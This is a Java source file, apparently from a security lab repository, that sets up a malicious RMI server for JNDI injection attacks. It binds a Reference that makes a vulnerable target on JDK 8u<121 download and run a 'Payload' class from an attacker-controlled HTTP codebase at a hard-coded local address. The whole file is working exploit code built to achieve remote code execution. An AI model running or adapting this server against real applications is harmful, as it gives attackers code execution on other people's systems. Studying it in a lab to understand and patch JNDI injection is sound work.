package nth347.servers.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * RMI server for exploiting JNDI injection using remote class loading
 * The exploitation technique requires the target application to run on JDK 8u<121
 * Tested with target application running on JDK 8u66
 */
public class EvilRMIServer {
    /**
     * RMI server configuration
     */
    private static String RMI_ADDRESS = "0.0.0.0";
    private static int RMI_PORT = 1099;
    private static String RMI_NAME = "Object";

    /**
     * Payload configuration
     */
    private static String CODEBASE_URL = "http://192.168.93.128:8000/";
    private static String JAVA_CLASS_NAME = "Payload";
    private static String JAVA_FACTORY = "PayloadFactory";

    public static void main(String[] args) throws Exception {
        System.setProperty("java.rmi.server.hostname", RMI_ADDRESS);
        System.setProperty("java.rmi.server.logCalls", "true");

        Registry registry = LocateRegistry.createRegistry(RMI_PORT);

        // Create a Reference
        Reference ref = new Reference(JAVA_CLASS_NAME, JAVA_FACTORY, CODEBASE_URL);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);

        // RMI URL will be rmi://192.168.93.128:1099/Object
        registry.bind(RMI_NAME, referenceWrapper);

        System.out.println("Evil RMI server has started at rmi://" + RMI_ADDRESS + ":" + RMI_PORT + "/" + RMI_NAME);
    }
}
